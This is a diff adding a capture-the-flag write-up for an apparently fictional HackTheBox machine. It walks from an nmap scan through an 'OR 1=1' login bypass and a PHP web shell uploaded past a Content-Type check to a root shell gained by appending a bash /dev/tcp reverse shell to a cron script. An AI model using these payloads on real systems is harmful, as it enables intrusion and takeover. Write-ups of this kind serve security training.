@@ -1,0 +1,62 @@
+---
+title: "HackTheBox - Example Machine Writeup"
+date: "2023-11-20"
+category: "Web Exploitation"
+tags: ["SQLi", "RCE", "Privilege Escalation"]
+event: "HackTheBox"
+difficulty: "Medium"
+---
+
+# Introduction
+This is a comprehensive write-up for the fictional machine "Example" from HackTheBox. This machine focuses on chaining a blind SQL injection into Remote Code Execution (RCE) via a vulnerable file upload mechanism, followed by a privilege escalation vector utilizing a misconfigured cron job.
+
+## Enumeration
+We begin by running an `nmap` scan against the target IP address to discover open ports:
+
+```bash
+nmap -sC -sV -p- -T4 10.10.11.200
+```
+
+The scan reveals two open ports:
+- **Port 22:** OpenSSH 8.2p1
+- **Port 80:** Apache httpd 2.4.41
+
+### Navigating the Web Service
+Visiting `http://10.10.11.200`, we observe a standard login portal for an internal application called "SecureMonitor". Trying default credentials yields nothing. I decided to intercept the login request using Burp Suite and inject a basic SQL payload into the username field:
+
+```http
+POST /login.php HTTP/1.1
+Host: 10.10.11.200
+Content-Type: application/x-www-form-urlencoded
+
+username=admin' OR 1=1-- -&password=test
+```
+
+And immediately, we are logged in as the `admin` user!
+
+## Exploitation
+Once inside the portal, there is a "Profile Picture Upload" feature. Looking at the request, the application relies purely on the `Content-Type` header and client-side validation to ensure only images are uploaded.
+
+I crafted a malicious PHP payload `shell.php` to obtain a reverse shell:
+
+```php
+<?php
+  exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1'");
+?>
+```
+
+I intercepted the upload request, changed the filename to `shell.php`, but kept the `Content-Type: image/png`. The server accepted the file. Navigating to `/uploads/shell.php` triggered the payload, and I received the reverse connection!
+
+## Privilege Escalation
+Once a foothold was established as the `www-data` user, I uploaded `linpeas.sh` to begin internal enumeration. Running it uncovered a suspicious script in `/opt/cleanup.sh` executed every minute by `root` via a cron job.
+
+The permissions on `/opt/cleanup.sh` were surprisingly misconfigured so the `www-data` user had write access! I appended a bash reverse shell payload to the end of the script:
+
+```bash
+echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/9002 0>&1'" >> /opt/cleanup.sh
+```
+
+A minute later, a second netcat listener caught the root shell. The machine was fully compromised.
+
+## Conclusion
+This machine highlights the importance of input sanitization and parameterized queries to prevent SQL injection. It also underlines the dangers of relying on weak mechanisms for file validations, and the absolute necessity of strict file permissions for automated jobs.
